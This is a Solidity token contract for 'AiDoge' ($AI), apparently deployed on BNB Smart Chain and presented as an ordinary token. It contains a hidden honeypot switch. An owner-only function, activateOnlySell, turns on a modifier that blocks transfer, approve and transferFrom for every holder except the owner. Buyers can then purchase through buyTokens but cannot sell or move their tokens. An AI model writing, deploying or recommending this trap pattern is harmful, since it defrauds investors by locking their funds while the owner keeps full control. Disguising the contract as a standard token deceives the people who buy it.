/**
 *Submitted for verification at BscScan.com on 2023-05-14
*/

pragma solidity ^0.8.2;

contract Token {
    string public name = "AiDoge";
    string public symbol = "$AI";
    uint public totalSupply = 1000000000 * 10 ** 18;
    uint public decimals = 18;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    address public owner;
    bool public onlySell;
    bool public onlyBuy;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
    name = "AiDoge";
    symbol = "$AI";
    totalSupply = 1000000000 * 10 ** 18;
    decimals = 18;
    balanceOf[msg.sender] = totalSupply;
    owner = msg.sender;
    onlySell = false;
    onlyBuy = false;
}


    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function.");
        _;
    }

    modifier onlyUnlockedSell() {
        require(!onlySell || msg.sender == owner || msg.sender == address(this), "Token sales are currently blocked");
        _;
    }

    modifier onlyUnlockedBuy() {
        require(!onlyBuy, "Token purchases are currently blocked");
        _;
    }

    function activateOnlySell() public onlyOwner {
        onlySell = true;
    }

    function deactivateOnlySell() public onlyOwner {
        onlySell = false;
    }

    function activateOnlyBuy() public onlyOwner {
        onlyBuy = true;
    }

    function deactivateOnlyBuy() public onlyOwner {
        onlyBuy = false;
    }

    function transfer(address _to, uint _value) public onlyUnlockedSell returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance.");
        require(_to != address(0), "Invalid recipient address.");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;
    }

    function approve(address _spender, uint _value) public onlyUnlockedSell returns (bool) {
        require(_spender != address(0), "Invalid spender address.");

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;
    }

    function transferFrom(address _from, address _to, uint _value) public onlyUnlockedSell returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance.");
        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance.");
        require(_to != address(0), "Invalid recipient address.");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);

        return true;
    }

    function buyTokens(uint _value) public onlyUnlockedBuy payable {
        require(msg.value >= _value, "Insufficient payment.");

        uint tokens = _value;
        require(balanceOf[owner] >= tokens, "Insufficient token balance.");

        balanceOf[owner] -= tokens;
        balanceOf[msg.sender] += tokens;

        emit Transfer(owner, msg.sender, tokens);
    }
}